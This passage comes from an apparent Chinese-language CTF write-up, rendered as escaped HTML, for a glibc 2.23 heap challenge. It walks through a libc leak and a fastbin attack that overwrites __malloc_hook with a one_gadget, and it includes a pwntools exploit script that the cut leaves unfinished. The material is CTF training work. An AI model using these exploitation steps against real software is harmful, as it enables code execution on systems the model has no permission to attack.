string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;malloc_hook&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__malloc_hook&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;因为 dump (2) 那里会输出 main_arena + 0x58 的地址所以需要减去 0x58 再减去 0x10 会找到 malloc_hook 的地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416212411772.png&#34; alt=&#34;image-20230416212411772&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后 libcbase 的偏移就可以算出来了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;此时 chunk4 是 unsorted bin。大小为 0x80，此时我们需要分配 0x60。会从 chunk4 里分割出来。我们把他定义为 chunk6，虽然是 chunk6，但是他在结构体数组中的索引为 4。因为 index 为 4 那里为空  所以他的内存地址为 chunk4&lt;/p&gt;
&lt;p&gt;free (4)  4 是下标为 4 所以 free 的是才申请的 chunk6&lt;/p&gt;
&lt;p&gt;这两步主要用来将 chunk4 分离出一个 fasbin 大小的 chunk6，然后再 free。chunk6 进入 fastbin。之后我们可以通过修改 chunk2 修改 chunk6 的值，然后再 malloc，进行 fastbin attack，可以任意地址分配。修改任意内存。&lt;/p&gt;
&lt;p&gt;我们现在需要修改 &lt;code&gt;__malloc_hook&lt;/code&gt;  的值。我们先找到 &lt;code&gt;__malloc_hook&lt;/code&gt;  的地址&lt;/p&gt;
&lt;p&gt;然后查看该 &lt;code&gt;__malloc_hook&lt;/code&gt;  附近的内存空间。&lt;/p&gt;
&lt;p&gt;我们想要在这范围内进行 malloc，就需要绕过 malloc 的限制。我们发现附近 &lt;code&gt;7f&lt;/code&gt;  比较多，我们可以找一个内存地址，将 &lt;code&gt;7f&lt;/code&gt;  当为我们要 malloc 的 size 位。&lt;/p&gt;
&lt;p&gt;例如如下的内存地址， &lt;code&gt;0x7fd25e3b7aed&lt;/code&gt; 。如果我们在这个地址进行 malloc，则 size 位为 0x7f。那我们分配一个 0x60 大小的 chunk，即可绕过 malloc 的限制。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416213543205.png&#34; alt=&#34;image-20230416213543205&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后一个字节是 7f 所以从 0x7f215166daed&lt;/p&gt;
&lt;p&gt;算出偏移为 0x3c4aed&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x3c4aed&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;第一个 allocate (0x60) 分配到 chunk6&lt;/p&gt;
&lt;p&gt;也就是下标为 4 的那里&lt;/p&gt;
&lt;p&gt;第二个 allocate (0x60) 分配的是下标为 6 的 chunk 这里可以动调看一下结构体内存就懂了&lt;/p&gt;
&lt;p&gt;修改完还没分配  可以看到 fd 那里是 libc_base+0x3c4aed&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416215139905.png&#34; alt=&#34;image-20230416215139905&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二个 allocate (0x60) 直接看堆是看不到的  需要看结构体指针那里 前面说过怎么看  会发现他的内存地址为 libc_base+0x3c4aed+0x10&lt;/p&gt;
&lt;p&gt;为什么加了 0x10  可能是前面的下标和判断是否存在占了 0x10  具体还不是很懂&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p8&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4526a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416214511799.png&#34; alt=&#34;image-20230416214511799&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里的 fill (6) 是修改的下标为 6 的结构体指针&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220041895.png&#34; alt=&#34;image-20230416220041895&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改的是下标为 6 所指向的内存地址也就是 0x00007f1d82b46afd 所指向的&lt;/p&gt;
&lt;p&gt;这里因为中断了一下 所以内存地址变了  但还是上面那个 这个是修改前的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416220229133.png&#34; alt=&#34;image-20230416220229133&#34;&gt;&lt;/p&gt;
&lt;p&gt;这是修改后的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416221513786.png&#34; alt=&#34;image-20230416221513786&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为是倒序的所以 0d 对应 3 个 00 而 0e 对应两个 00 所以要 p8 (0)*3&lt;/p&gt;
&lt;p&gt;执行代码后，即可修改 **__malloc_hook** 的值，可以看到已经将__malloc_hook 修改为 one_gadget 了。下次调用 malloc 或者 calloc 的时候就可以获得 shell。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;os&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;arch&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# r=remote(&#34;node4.buuoj.cn&#34;,28959)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;process&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;libc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;libc-2.23.so&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;allocate&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Size: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;fill&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Size: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Content: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Command: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;4&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index: &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;idx&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#2&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#3&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#4&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;free&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token 